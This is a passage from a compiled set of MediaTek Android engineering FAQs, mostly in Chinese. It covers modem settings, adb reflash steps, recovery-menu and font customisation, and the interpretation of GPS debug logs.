Method 2：Modify nvram_data_items.c
For GPRS, change 0xb3 to oxab, 0xb2 to 0xaa
 #if defined(__EDGE_CARD_CLASS_10__) || defined(__GPRS_MULTISLOT_CLASS_10__)
                  0xab,   /* Default GPRS multislot class 10, ext DA support, R99 */
   #else
                  0xb3,  /* Default GPRS multislot class 12, ext DA support, R99 */
   #endif
#else /* __R99__*/
   #if defined(__EDGE_CARD_CLASS_10__) || defined(__GPRS_MULTISLOT_CLASS_10__)
                  0xaa,   /* Default GPRS multislot class 10, ext DA support, R98 */
   #else
                  0xb2,  /* Default GPRS multislot class 12, ext DA support, R98 */
   #endif
#endif /* __R99__ */
For EDGE, change 0xD9 to 0xD5
#ifdef __EGPRS_MODE__
   #if defined(__EDGE_CARD_CLASS_10__) || defined(__EDGE_MULTISLOT_CLASS_10__)
                  0xD5,   /* PFC on, EGPRS multislot class 10, Ext DA support */
   #else
                  0xD9,   /* PFC on, EGPRS multislot class 12, Ext DA support */
   #endif
 
Method 3：MTK builds code

TODO : 不同的class有什么区别?
```

## [FAQ14620]  [Speech Common]  如何使2G通话支持AMR_WB编码

```text
MTK release给客户的code默认情况为：
2G不支持AMR_WB，3G支持AMR_WB
如果贵司希望2G也要支持AMR_WB请参考此FAQ
[SOLUTION] 
1.将custom_l4_utility.c的custom_check_white_list()里面所有的*is_gsm_white_list = KAL_TRUE;
2.修改好后replace modem load并format modem NVRAM
replace modem load方法：
– 把modem的bin file重命名为modem.img并放在adb.exe路径下
– adb remount
– adb push modem.img /system/etc/firmware/modem.img
– adb shell sync
– adb shell reboot
format modem NVRAM方法：
– adb shell
– cd data/nvram 
– rm -r md 
– reboot
```

## [知识点]  [FAQ10979]  [SP Flash Tool] What is the difference between BROM VCOM and Pre-Loader VCOM?

```text
Both BROM and Pre-Loader VCOM can be used to connect FlashTool or META tool, by which the device boots to download mode or META mode.

However, there are still some differences:
1. Different triggering ways and time-outs (USB only)
BROM: Usually you have to press download key(KCOL0) to force BROM VCOM; 3S time-out by default.
With an empty device, it boots to BROM mode with 40S time-out by default.
Pre-Loader: Always generates VCOM when USB cable in; 2.5S time-out by default.
Also called the Pre-Loader VCOM auto-detection.

2. Different handshaking protocols for PC tool (for both USB and UART)
The PC tool have to distinguishes VCOM as  BROM VCOM or Pre-Loader VCOM,

and applies the right commands or protocol to successfully connect to the device.
This action is done by MTK FlashtoolLib.dll for USB, you do not have to configure anything.
However, for UART VCOM, the device ID is not defined by BROM or Pre-Loader;
therefore PC tool can not distinguish between BROM and Pre-Loader, and has to configure it manually.

By default, MTK META tool supports Pre-Loader UART VCOM only.

3. Different USB capability and spec(USB only)
BROM VCOM is based on USB 1.1 with HW code stack(BROM means Boot-ROM in chip)
Pre-Loader VCOM is based on USB 2.0 with open source code stack, 
you can update Pre-Loader to change its flow and behavior.

4. Device side environment and HW module state may be different (for both USB and UART)
Like USB/PLL clock/DDR clock/External DRAM and other modules, it may be inited or re-inited.

5. For security project, BROM and Pre-Loader mode have different authority designs. 
There is no difference among non-security projects.

This applies to both USB and UART VCOM.

Note. "VCOM" mentioned here stands for both USB and UART VCOM, if not dedicated.
```

## [知识点]  [FAQ02249]  IMEI、IMEISV、SVN

```text
Description
关于IMEI、IMEISV、SVN
Solution
概念：
IMEI(International Mobile Equipment Identity)是国际移动设备身份码的缩写，固化于手机中，每个手机的IMEI应该是唯一、不变的。
IMEI码由GSM（全球移动通信协会）统一分配，授权BABT（英国通信认证管理委员会）审受。
2004年以前的标准中，IMEI共15位（取值必须是0~9的数字），依次分别是6位TAC、2位FAC、6位SNR、1位CD校验位。
2004年以后的标准中删去了最后的1位CD校验位，新加入了2位SVN(software version number)，故称IMEISV，共16位（取值仍必须是0~9的数字）。
SVN的取值也必须是0~9的数字，而且99这个值是被保留的。
网络对于IMEI或者IMEISV的检查：
网络对于IMEI或者IMEISV的检查是非必须的，各运营商会按照自己的策略在通信的某个阶段检查手机的IMEI或者IMEISV，并可能做进一步的动作。
可能检查IMEI或者IMEISV的阶段有：
开机注册网络时
周期性位置更新时
进行接打电话、收发短信、上网等业务时
或者其他（根据运营商的策略决定）
网络检查的时候会指明检查IMEI还是IMEISV，如果是检查IMEI，则手机许上报前14位IMEI（1位CD校验位不上报），如果是检查IMEISV，则手机上报16位IMEISV
 
与IMEI和IMEISV相关的协议标准是3GPP TS 23.003
```

## [FAQ02069]  NITZ网络自动对时功能不起作用

```text
在手机选项中开启了自动更新时间/日期，但是时间日期并没有自动更新
Root Cause
1. 网络不支持NITZ功能
2. NITZ信息在PS域(GPRS/EDGE)上发送
Solution
1. 请用对比机测试看是否能自动更新时间，如果其他平台手机也不行则可能是当地的移动网络不支持NITZ功能，或者可以在开机过程的catcher log中搜索是否有MM_Information这个消息，没有的话说明网络不支持NITZ
2. 请把GPRS连接设置为“一直在线”，或者打开会上网的程序以激活GPRS连接看时间是否能更新
```

## [debug]  [FAQ02064]  信号跳变严重

```text
在空闲待机状态下，信号跳变严重
Root Cause
可能的原因有：
天线性能不良
RF校准数据不正确
当时环境中的信号确实不稳定
金属外壳或者手握的方法使信号衰减
插入USB线时的电磁干扰影响到天线

Solution
首先检查以上各种可能的原因，如果都排除后还是信号跳变严重，请抓取log提交给我司分析
```

## [log]  [FAQ02411]  [Field Trial] 怎样从log中查看手机支持哪些GEA加密方法

```text
首先连接上catcher抓取FT的log。做GPRS attach的动作。
在trace中查找[MS->NW] GMM_ATTACH_REQUEST.在primitive log窗口中。
点击[MS->NW] GMM_ATTACH_REQUEST他后面的第一条 DATA_REQ消息。
察看peer_message.08 01 02 f5 e0 41 08 02 05 f4 e2 38...
从第三个octect开始，就是MS NETWORK CAPABILITY
02表示MS NW CAPABILITY的长度为两个octect

8 7 6 5 4 3 2 1
1 1 1 1 0 1 0 1
1 1 1 0 0 0 0 0

第1排第8bit表示GEA/1=1表示avilable。
第2排第2-第7bit开始，从高位到低位表示GEA/2-GEA/7，因此
GEA/2 avilable
GEA/3 avilable
GEA/4 not avilable
GEA/5 not avilable
GEA/6 not avilable
GEA/7 not avilable
```

## [FAQ14484]  如何修改L版本recovery mode 小机器人界面进入菜单，由volume up&power改为直接按power(如同KK以前版本)

```text
L版本进入recovery mode 会出现小机器人界面
需同时按volume up & power 才能进入菜单，
如何改为像KK以前版本，直接按power 进入菜单
 
[SOLUTION] 
 
1.alps/bootable/recovery/Ui.cpp

key_long_press(false), 
key_down_count(0), 
enable_reboot(true), 
+ recovery_show_menu_flag(0), 
consecutive_power_keys(false), 
consecutive_alternate_keys(0), 

RecoveryUI::KeyAction RecoveryUI::CheckKey(int key) { 

+    if (key == KEY_POWER && recovery_show_menu_flag==false) { 
+      recovery_show_menu_flag=true; 
+      return TOGGLE; 
+    } 

if ((IsKeyPressed(KEY_POWER) && key == KEY_VOLUMEUP) || key == KEY_HOME) { 

2.alps/bootable/recovery/ui.h

int rel_sum; 
+ bool recovery_show_menu_flag; 
int consecutive_power_keys; 
int consecutive_alternate_keys; 
```

## [FAQ14396]  [audio] 如何取消安全音量警示框?

```text
当插入有线耳机调节音量时，有一个音量保护，当超过某一个值时会弹出安全音量警示框，如何使之默认不显示?

[SOLUTION] 
KK版本：
关闭宏 MTK_SAFEMEDIA_SUPPORT
L版本：
alps\frameworks\base\core\res\res\config.xml 里的 config-safe_media_volume_enabled 设为 false
```

## [FAQ14013]  setting-关于手机-法律信息中对源码全选后操作无反应

```text
由于该网页非常大，所以全选这个操作非常费时，而且还有可能导致mem问题。
建议修改是去掉select all的action bar
[SOLUTION] 
可以通过以下改动去掉ActionBar中的Select All功能
也就是在这个节目不show出这个选中全部的acitonbar，

external/chromium_org/content/public/android/java/src/org/chromium/content/browser/SelectActionModeCallback.java
...
private void createActionMenu(ActionMode mode, Menu menu) {
    mode.getMenuInflater().inflate(R.menu.select_action_menu, menu);
    /// M: delete select all in settings app @{
    if (mContext.getPackageName().contains("com.android.settings")) {
        menu.removeItem(R.id.select_action_menu_select_all);
    }
    /// @}
...
```

## [FAQ04513]  如何添加新的字库

```text
新增字库有2种方法，一是替换原有的字库、二是加入到系统字库，其具体方法如下：

一、替换系统原有的字库：
如替换中文字库，把这个三方字库重命名为DroidSansFallBack.ttf，并拷贝到alps\frameworks\base\data\fonts下进行替换，重新编译就行。
如需替换其他字库（请参考FAQ12255 ，FAQ04224 ）找出对应的字库并替换。

二、添加到系统字库
1.         把对应的字库文件拷贝到frameworks/base/data/fonts下
2.         修改fallback_fonts.xml (frameworks/base/data/fonts)文件
<family>
    <fileset>
        <file>myfont.ttf </file>
    </fileset>
</family>

添加字库的时候需要把自己需要添加的字库写到fallback_fonts.xml 文件的前面，
如果写到结尾处如果之前的字库有该字体就会使得自己添加的字库无法生效。

（2.1 ） 在ANDROID L上同时需要在framework/base/data/fonts/目录下FONTS.XM文件中加入定义如
<font weight="100" style="normal">Roboto-Thin.ttf</font>
（weight代表字体的粗细 style是字体风格。可以根据贵司自定义字库和FONT文件中的字库定义）（其他android版本无需这个步骤）

3.         修改fonts.mk (frameworks/base/data/fonts)

a、ICS
PRODUCT_COPY_FILES := \
......
frameworks/base/data/fonts/NewFontFile.ttf:system/fonts/myfont.ttf \

b、JB
PRODUCT_PACKAGES:= \
myfont.ttf \
DroidSansFallback.ttf  \
......

4. 对于JB2,JB3,JB5,JB9,KK,L还需修改Android.mk
ifeq ($(MINIMAL_FONT_FOOTPRINT),true)
……
else # !MINIMAL_FONT
font_src_files += 
myfont.ttf \
……

5.对于GB版本的添加方法如下
1) 拷贝myfont.ttf文件到 alps\frameworks\base\data\fonts下
2) 修改frameworks/base/data/fonts/Android.mk文件：
copy_from := \ 
DroidSansMono.ttf \ 
myfont.ttf\ 
……

3) 修改external/skia/src/ports/SkFontHost_android.cpp 文件：
//增加以下语句
{"myfont.ttf", gFBNames}, 

6.         重新编译工程，download bin到手机测试。
```

## [FAQ09809]  [NW] 运营商名称支持多语言

```text
运营商的名称显示，和多个方面有关系，在阅读本FAQ之前建议先参考
“FAQ09394 [NW] 网络运营商名称显示&SIM名称显示”
 
如FAQ09394所讲，运营商名称有4种来源，这里讲到的只会是第4种，也就是存储在xml中的，也只有用这种来源显示的名字才能扩展成支持多语言。那在xml中的，只有一种显示语言，就是spn这个字段的内容，如果切换语言，这个名称也不会变。
 
例如Spn-conf.xml中有个字段<spnOverrides numeric="31000" spn="NEPW"/>，也就是运营商的plmn是31000，其对应的名称是“NEPW”。当运营商的来源是xml时，那这种case下这个运营商的名称会显示“NEPW”，那即使当前手机切换到其他语言，仍然显示的是“NEPW”。
 
[SOLUTION] 
有了上面的背景，那就切入正题，要想在这种case下(当运营商的来源是xml)支持多语言显示，就要在对应res中添加一个Strings，然后再添加各种语言的翻译，然后显示的时候就用res中string，而不用读取xml中的spn了。 具体做法如下:
(1)在alps\mediatek\frameworks\base\res\res\values\Strings.xml(L之后的版本：alps\vendor\mediatek\proprietary\frameworks\base\res\res\values\strings.xml)中定义个字串,其名称为A
(2)在同res目录下的其他values添加A对应的语言翻译
(3)在alps\mediatek\frameworks\base\res\res\values\public.xml (L之后的版本：alps\vendor\mediatek\proprietary\frameworks\base\res\res\values\ public.xml)中添加A的id, id取值type为string的那一组的最后一个string的id+1 
(4)在alps\frameworks\opt\telephony\src\java\com\android\internal\telephony\Ril.java (L之后的版本：alps\frameworks\opt\telephony\src\java\com\android\internal\telephony\uicc\SpnOverride.java)中的lookupOperatorName()方法，依照numeric等于A运营商的plmn，其operName就是这个字串A的内容。
 
因为运营商有很多，把所有的运营商名称都换成这个样子比较耗工作量(请按照需求添加)。
 
注: 目前只支持实体运营商，MVNO还不支持
```

## [FAQ08700]  锁屏界面播放音乐或者FM时, 按音量键没有VolumePanel显示

```text
在 Keyguard 界面，播放music 或者FM时，按音量键可以调节音量大小，但是不显示出 VolumePanel, 这是 Google  default design，Google 原生对比机也是这样的行为。

在 Keyguard 出现的時候，之所以不显示 VolumePanel 是因为 KeyguardViewBase .interceptMediaKey()把 volume 相关的 keys 拦下來，直接呼叫 AudioManager 的调整音量 API，直接调整音量，但不显示出 UI.

[SOLUTION] 
如果希望在 Keyguard 画面下仍然要 show 出 VolumePanel，可以改写 KeyguardViewBase
private static final boolean KEYGUARD_MANAGES_VOLUME = true; // 把这里改成 false即可。
keyguard界面调节音量并显示VolumePanel只针对当前播放music 或者FM时，并不是调整当前情景模式的音量，二者不要混淆，后者目前不支持。
```

## [font]  [FAQ13826]  android L 上切换字库方法

```text
本FAQ介绍的是在 android  L上需要实现切换字库的功能。
 其他android版本上切换字库请参考FAQ09662 
[SOLUTION] 
切换字体我司提供两种方法
方法一：无论是在何种语言下都使用客户定制的字库
方法二：在特定的语言下使用客户定制的字库

方法一
1.         把对应的字库文件拷贝到frameworks/base/data/fonts下

2.         修改fallback_fonts.xml (frameworks/base/data/fonts)文件（在文件中加入客户定制的字库）
例如
<family>
    <fileset>
       <file>myfont.ttf </file>
    </fileset>
</family>

3. framework/base/data/fonts/目录下FONTS.XM文件中加入定义如
<font weight="100" style="normal">Roboto-Thin.ttf</font>

方法二
前面两步和方法一的前两步一致，第三步改为如下
3. 如果是需要在某些语言需要切换字库而其他语言不需要，直接加入如下步骤。
framework\base\graphics\java\android\graphics\FontListParser.java
中的
private static Family readFamily(XmlPullParser parser) 这个函数中在下面对应位置加入红色代码
        throws XmlPullParserException, IOException {
    String name = parser.getAttributeValue(null, "name");
    String lang = parser.getAttributeValue(null, "lang");
    String variant = parser.getAttributeValue(null, "variant");
    List<Font> fonts = new ArrayList<Font>();
    while (parser.next() != XmlPullParser.END_TAG) {
        if (parser.getEventType() != XmlPullParser.START_TAG) continue;
        String tag = parser.getName();
        if (tag.equals("font")) {
            String weightStr = parser.getAttributeValue(null, "weight");
            int weight = weightStr == null ? 400 : Integer.parseInt(weightStr);
            boolean isItalic = "italic".equals(parser.getAttributeValue(null, "style"));
            String filename = parser.nextText();
 //added 
 String country_code=SystemProperties.get("persist.sys.lang_country", "GB");
 if(country_code.equals("RU") ||country_code.equals("UA")){
        if(filename.equals("Roboto-Regular.ttf")){
                      filename = "RobotoCondensed-Regular.ttf";
  }
}
 //end
```

## [FAQ14324]  [Audio App] L1(>=5.1)版本, 后台播放音乐，浏览器访问百度音乐首页，后台音乐不会停

```text
L1 之后的版本, 后台播放音乐的状态下,使用浏览器(google chromium )访问百度音乐首页, 后台音乐不会停止播放
而 KK 或之前的版本, 相同的情况下, 后台音乐会停止播放

[SOLUTION] 
这个问题是 L1 版本所特有的, 通过分析我司发现:

chromium 浏览器在播放百度首页上音乐的时候, 去 requestAudioFocus 时发出的通知是 AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK, 这个通知不会停止其它程序的声音输出,
但会使其它程序的声音输出暂时变低一下. 这个是 google chromium ap 行为.

相比于 L 或之前 KK 的版本, 其 requestAudioFocus 时发出的通知是 AUDIOFOCUS_LOSS,
所以后台音乐会停止播放
```

## [FAQ13715]  [Gallery]  如何修改gallery的背景色

```text
Gallery的背景色定义在：
Gallery2/res/values/colors.xml 文件中

<!-- configuration for album set page -->
<color name="albumset_background">#1A1A1A</color>

<!-- configuration for album page -->
<color name="album_background">#1A1A1A</color>

<!-- configuration for photo page -->
<color name="photo_background">#1A1A1A</color>

上述3个定义分别对应了gallery3个page的背景色；
如果需要修改背景色为黑色，则需要将对应值修改为#000000；
如果需要修改背景色为白色，则需要将对应值修改为#FFFFFF。

L版本补充说明：
在L版本Photopage页面，背景色不再从上述文件中获得，则第三项修改不起效；
请参照如下方式进行修改：
PhotoPage.java
protected float[]  getBackgroundColor() {
    if (mModel != null && mModel.isCamera(0)) {
        mPhotoPageBackgroundColor[0]  = 0.0f;
    } else {
        mPhotoPageBackgroundColor[0]  = 1.0f;
        mPhotoPageBackgroundColor[1]  = 1.0f;
        mPhotoPageBackgroundColor[2]  = 1.0f;
        mPhotoPageBackgroundColor[3]  = 1.0f;
        Log.d(TAG, "PhotoPage.getBackgroundColor");
    }
    mBackgroundColor = mPhotoPageBackgroundColor;
    return mPhotoPageBackgroundColor;
}
如上蓝色标示位置，都修改为1.0f则是白色；如果都修改为0.0f则是对应黑色。


补充问题分析：
修改整个window的theme为白色，再修改以上背景色为白色后，进入gallery时仍会闪出一帧黑色背景：
可尝试修改Gallery2/res/layout/gl_root_group.xml文件如下：
<View android:id="@+id/gl_root_cover"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@android:color/black"
    android:visibility="gone"/>
请将android:background="@android:color/black"  颜色修改为白色。
```

## [FM]  [FAQ10669]  设定FM打开时默认频率的方法

```text
同的FM chip 会包含各种不同的频率反馈以满足不同国家/区域的使用，鉴于此情况就会有FM打开时默认开启的频率的修改需求。
此FAQ 提供客户定制自己FM 开启时的默认频率。由于此部分的设定是在java层，所以不同平台、不同chip修改方法都是一样的。
具体方法如下。

修改 alps/mediatek/packages/apps/FMRadio/src/com/mediatek/FMRadio/FMRadioUtils.java 中
public static final int DEFAULT_STATION = FeatureOption.MTK_FM_50KHZ_SUPPORT ? 8000 : 800;
```

## [gps]  [log]  [FAQ14168]  GPS问题调试—MobileLog中有关GPS关键LOG的释义

```text
在mobile log中，有很多GPS相关的log出现在main log和kernel log、properties文件中，他们的意思是什么，通过这篇文档进行总结，以便在处理GPS 问题时，能够根据这些log快速的收敛问题。

特别先提醒，这些log并非所有的软件版本上都有，所以只需要根据已经的log结合这份文档即可。

Properties文件，可以收集到该问题相关的版本信息
1.   168 [ro.mediatek.version.branch] : [KK2.MP13] 
2.   169 [ro.mediatek.version.release] : [ALPS.KK2.MP13.V1.1] 
3.   222 [gsm.project.baseband] : [6752_LWT_KK_MD1_HW(DEFAULT)] 
4.   227 [gsm.version.baseband] : [MOLY.LR9.W1423.MD.LWTG.CMCC.MP.V1.P33

Kernel log文件
1.    16468 <3>[  280.806548]  (0)[341:mtk_wmtd]  [WMT-PLAT]  [I] wmt_plat_dump_pin_conf:GPS_SYNC(not defined)
GPS SYNC pin不用配置

2.   16469 <3>[  280.806557]  (0)[341:mtk_wmtd]  [WMT-PLAT]  [I] wmt_plat_dump_pin_conf:GPS_LNA(GPIO-2147483580)
GPIO-2147483580表示的GPIO68,这个GPIO的配置在“GPS问题大全.docx”的4.1章节有提到如何配置该GPIO。如果没有使用外部LNA，那么就不需要配置该GPIO了。

3.    16626 <3>[  280.852549]  (1)[341:mtk_wmtd]  [WMT-CONF]  [I] wmt_conf_parse:#32(co_clock_flag)=>0x0
从这一条中的co_clock_flag=0表示采用的TCXO的方案，如果为1表示采用的是Coclock.

4.    17055 <4>[  281.533172]  (0)[237:mnld]  [GPS]  GPS_open: WMT turn on GPS OK!
打开GPS

5.    45005 <4>[  437.737848]  (0)[237:mnld]  [GPS]  GPS_close: WMT turn off GPS OK!
关闭GPS
 
Main log文件
1.   03400 05-13 16:07:58.210429   766  1337 V Provider/Settings:  from settings cache , name = location_providers_allowed , value = gps,network
Value后面的值表示的定位方式，这里表示gps定位和网络定位。

2.   04132 05-13 16:08:06.191351   766  1387 D LocationManagerService: request 42815df8 gps Request[ACCURACY_FINE gps requested=0 fastest=0]  from com.mediatek.ygps(1001)
这里是表示gps定位，其应用是ygps，这一点经常会被用到debug 问题

3.   04142 05-13 16:08:06.193005   766   787 D GpsLocationProvider: startNavigating, singleShot is false
打开GPS

4.   04227 05-13 16:08:06.295280   237   237 D mnl_linux: mnl_utl_load_property: EPO_Enabled: 1
这里表示EPO使能,EPO是可以提供星历辅助数据

5.   04228 05-13 16:08:06.295286   237   237 D mnl_linux: mnl_utl_load_property: BEE_Enabled: 1
这里表示BEE使能，BEE是可以提供星历辅助数据。

6.   04229 05-13 16:08:06.295548   237   237 D mnl_linux: mnl_utl_load_property: SUPL_Enabled: 1
这里表示AGPS使能

7.   04238 05-13 16:08:06.296514   237   237 D MNLD    : launch_daemon_thread: chip_id is 0x6752
GPS chip是6752

8.   04279 05-13 16:08:06.301853   237   237 D mnl_linux: mtk_gps_sys_init: gps_tcxo_hz : 26000000
采用26M时钟

9.   04280 05-13 16:08:06.301861   237   237 D mnl_linux: mtk_gps_sys_init: gps_tcxo_ppb : 0
0表示时钟频偏采用默认2000ppm

10.  04286 05-13 16:08:06.301995   237   237 D MNLD    : linux_gps_init: TCXO
表示采用的是TCXO，非省晶体方案

11.  03928 01-14 23:36:49.154   171   171 D MNLD    : linux_gps_init: GPS coclock
表示采用的是Coclock，省晶体方案

12.  05-13 16:08:07.030960   237   237 D MNLD    : linux_gps_init: GNSSOPMode: 2
这里GNSSOPMode=2

13.  17129 05-15 03:36:25.760   288   325 D agps    : [agps]  [n]  [AGPS]  [MNL]  read  pmtk=[$PMTK764,0,0,0,1,0,128*3D
PMTK764这个log可以知道当前是支持什么卫星系统的， 三个0后面的1表示支持1种卫星系统；
1后面的0和128表示对这个卫星系统的说明，0表示是GPS卫星
0042 $$PMTK764,0,0,0,2,0,128,4,128*15
这个PMTK764中的2表示支持2种卫星系统，（0，128）表示GPS卫星系统，（4，128）表示GLONASS

14.  05-13 16:08:07.031018   237   237 D MNLD    : linux_gps_init: init_cfg.C0 = 0
如果是Coclock方案，0表示没有校准

15.  05-13 16:08:07.031026   237   237 D MNLD    : linux_gps_init: init_cfg.C1 = 0
如果是Coclock方案，0表示没有校准

16.  05-13 16:08:07.031035   237   237 D MNLD    : linux_gps_init: init_cfg.initU = 0
如果是Coclock方案，0表示没有校准

17.  05-13 16:08:07.031043   237   237 D MNLD    : linux_gps_init: init_cfg.lastU = 0
如果是Coclock方案，0表示没有校准

18.  04377 05-13 16:08:07.036831   237   237 D MNLD    : linux_gps_init: dbg_file_name (/data/misc/gpsdebug.log) 
这里表示gps debug log存放在/data/misc下面

19.  016963 05-12 09:48:22.431   266   266 D MNLD    : linux_gps_init: dbg_file_name (/storage/sdcard0/mtklog/gpsdbglog/gpsdebug.log) 
这里表示gps debug log存放在/storage/sdcard0/mtklog/gpsdbglog/下面

20.  04408 05-13 16:08:07.526851   237  2792 D mnl_linux: mtk_gps_sys_nmea_output_to_app: $PMTK010,001*2E
PMTK010表示GPS软件已经跑正常了，这一点是判断GPS软件正常工作常用的手段。

21.  04419 05-13 16:08:07.531313   237  2792 D mnl_linux: $GNRMC,080807.009,V,3953.7875,N,11620.6085,E,0.000,0.00,130515,,,N*5B
NMEA也是判断GPS软件正常工作常用的手段

22.  04439 05-13 16:08:07.531876   766   787 D gps_mtk : mtk_gps_start: line = 3644sta.status = GPS_STATUS_ENGINE_ON
通过该log“GPS_STATUS_ENGINE_ON”，在手机最上面的状态栏，是可以看到GPS定位状态图标

23.  05944 05-13 16:08:20.550455   766  2574 D GpsLocationProvider: TTFF: 13003
表示GPS的定位时间死13.003s

24.  25275 05-13 16:10:42.491472   766   787 D GpsLocationProvider: stopNavigating
关闭GPS

25.  25366 05-13 16:10:42.511134   766  2574 D gps_mtk : mnld_to_gps_handler: line = 3020sta.status = GPS_STATUS_ENGINE_OFF
通过该log“GPS_STATUS_ENGINE_OFF”，在手机最上面的状态栏，GPS定位状态图标消失

26.  25378 05-13 16:10:42.795323   766  1376 D gps_mtk : mtk_gps_delete_aiding_data: line = 3898Send MNL_CMD_RESTART_FULL in HAL
这里的log表示是FULL start，如果看到下面图片的log，请对应查找

27.  083004 05-12 09:50:00.510   827  1468 D LocationManagerService: request 1434db9 gps Request[ACCURACY_FINE gps requested=+10s0ms fastest=+10s0ms]  from com.tct.weather(10052)
108716 05-12 09:50:31.004   827  1468 I LocationManagerService: remove 1434db9
通过上面的log可得知GPS定位开始的时间和结束的时间，是com.tct.weather这个应用打开的GPS，这里的1434db9很重要，是你判断结束的对应log点

28. 
109104 05-12 09:50:31.404   827  8800 V GpsLocationProvider: GNSS SV count: 9 ephemerisMask: 0 almanacMask: 0
109105 05-12 09:50:31.405   827  8800 V GpsLocationProvider: sv: 22 snr: 0.0 elev: 66.0 azimuth: 198.0
109106 05-12 09:50:31.406   827  8800 V GpsLocationProvider: sv: 14 snr: 0.0 elev: 54.0 azimuth: 15.0
109107 05-12 09:50:31.408   827  8800 V GpsLocationProvider: sv: 25 snr: 3.0 elev: 52.0 azimuth: 55.0   U
109110 05-12 09:50:31.409   827  8800 V GpsLocationProvider: sv: 31 snr: 2.3600001 elev: 48.0 azimuth: 289.0   U
109111 05-12 09:50:31.409   827  8800 V GpsLocationProvider: sv: 18 snr: 2.48 elev: 36.0 azimuth: 162.0   U
109113 05-12 09:50:31.410   827  8800 V GpsLocationProvider: sv: 32 snr: 0.0 elev: 24.0 azimuth: 318.0
109116 05-12 09:50:31.412   827  8800 V GpsLocationProvider: sv: 12 snr: 3.2 elev: 16.0 azimuth: 39.0   U
109117 05-12 09:50:31.412   827  8800 V GpsLocationProvider: sv: 29 snr: 0.0 elev: 13.0 azimuth: 115.0
109120 05-12 09:50:31.413   827  8800 V GpsLocationProvider: sv: 4 snr: 0.0 elev: 7.0 azimuth: 280.0
从上面的log上可以看到可视卫星有9颗，每颗卫星的ID、SNR、ELEV、AZIMUTH

29. 
109109 05-12 09:50:31.408   827   860 D LocationManagerService: incoming location: Location[gps 23.032397,114.349453 acc=7 et=+35m46s616ms alt=43.0 vel=0.0 bear=10.53 {Bundle[{}] }] 

有这行log，表示这一秒一定是定位成功的，这个log中的gps表示这个定位成功的位置是GPS提供出来的。

30.  
04520 05-13 16:08:07.548131   766  1378 D LocationManagerService: request 42509ab8 network Request[POWER_LOW network requested=+1s0ms fastest=+1s0ms]  from com.mediatek.nlpservice(10047)
04566 05-13 16:08:07.576011   766   787 D LocationManagerService: incoming location: Location[network 39.896459,116.343475 acc=257 et=+23m51s504ms] 
04580 05-13 16:08:07.582307   766  1226 I LocationManagerService: remove 42509ab8
从这几行log中的“network Request[POWER_LOW network requested”表示是网络定位，是” com.mediatek.nlpservice”应用或者是服务去请求的，网络定位比较快，可以看到立即就拿到了位置，根据42509ab8，可以判断什么时候关闭了这次网络定位

31.  
04581 05-13 16:08:07.582319   766   787 D gps_mtk : mtk_gps_inject_location: line = 3845ts.tv_sec= 229820461603619098,ts.tv_nsec = 8953004843085074432
04582 05-13 16:08:07.582352   766   787 D gps_mtk : mtk_gps_inject_location: line = 3846inject location lati= 39.896459, longi = 116.343475,accuracy =257.000000

这里的log表示将位置辅助和参考时间数据注入给GPS 模块，来加速GPS定位。
```

## [gps]  [log]  [FAQ07950]  如何分析GPSLog

```text
对于GPSLog有两种类型的文件，主要是依据其文件内容划分。文件内部存储的只是$GP开口的log，那么这种log称为NMEA log；文件内部除了$GP的log，还有其他的一些log，例如$PMTK的log等等，这种log称为GPS DebugLog。

其实一般情况下，可以通过NMEALog就可以看出来很多的信息。看NMEALog主要是对NMEA协议里的集中常用NMEA语句的各个字段熟悉即可。

1.   基本检查

GPGGA中可以得到UTC时间、经纬度、当前定位状态、使用的卫星数目、HDOP等等；

GPGSA中可以得到定位类型、所使用到的卫星ID；

GPGSV中可以得到可视卫星的数目，然后会一次列举出每科可视卫星的ID、方位角、仰角和信号强度；

GPRMC中可以得到UTC时间、定位状态、经纬度、速度、UTC日期；

GPACCURACY是我司加入的获取定位精度的语句。

2.   检查SNR

根据SNR值是很好的判断卫星信号强弱的方法，强信号是指CNR大于40db，中讯号是指 CNR大于30db，弱讯号是指CNR大于20db，20db以下视为极弱讯号。我司根据的spec:6颗卫星SNR>40db，可以达到CEP:3m。

在测试传导性能/整机性能的时候，打入-130dbm的信号，如果可以看到收到的卫星SNR>40.5db,这表示贵司的硬件GPS天线做的不错;如果是在35db以下，可能就是表示硬件GPS做的很差喽。

3.   缺少哪些辅助资讯

如果产看是否触发AGPS，需要从GPS debug Log中分析，搜索PMTK730这个语句，因为辅助数据主要是看时间、位置、星历这三个。$PMTK730,0,0,0,1,0,1,1,0：从这个语句中的一个1表示缺少星历、第二个1表示缺少位置、第三个1表示缺少时间。PMTK710表示获取星历辅助数据，PMTK712表示获取时间辅助资讯，PMTK713表示缺少位置辅助资讯。

当所有的辅助资讯都有拿到之后，显示出来的PMTK730后面的都会是0.

4.   查看卫星分布如何

通过看GPGSV里的卫星的方位角和仰角可以判断卫星的位置，通过判断GPGSA里的卫星可以知道当前定位使用了哪些卫星，这样就可以知道当前使用定位计算的这些卫星的卫星分布如何、信号强度如何。

通过GPGGA里的HDOP来判断当前卫星的分布如何，这个值越小越好。卫星分布越好，越有可能产生的定位精度越高。所以HDOP是定位精度的充分但非必要条件。

5.   当前有哪些星历被保存

通过搜索GPS Debug Log文件中PMTKEPH，该关键词会告诉你当前有哪些卫星是已经解析下来辅助资讯的。例如PMTKEPH,3,12,15,18表示有3颗卫星已经解析下来了星历数据，他们的卫星ID 是12、15、18.

6.   如何判断GPS已经正常工作

GPS工作起来首先会在GPS debug Log中打印出来PMTK010的字样，所以通过判断这个可以知道GPS是否有正常工作起来。

7.   星历数据是来自EPO、HotStill还是实时解算

如果知道当前使用到的卫星星历数据是来自实时接收解算下来的星历、还是EPP,或者是HotStill，同样也是通过判断PMTKEPH。

如果该关键字后面跟着的卫星ID是正整数，那么是实时接收解算下来的星历；

如果是浮点数，而且是负数，但是小数点后都是0，表示的是EPO；

如果是浮点数，而且是负数，但是小数点后的是非0，表示的是Hotstill；

8.   判断AGPS/EPO/HotStill是否工作

从GPS Debug log中搜索到wk，epo表示EPO有工作；

从GPS debug log中搜索到wkbee表示Hotstill有工作；

从GPS Debug log中搜索到wkssi表示AGPS有工作。

9.   H/W/C/F GPS Start

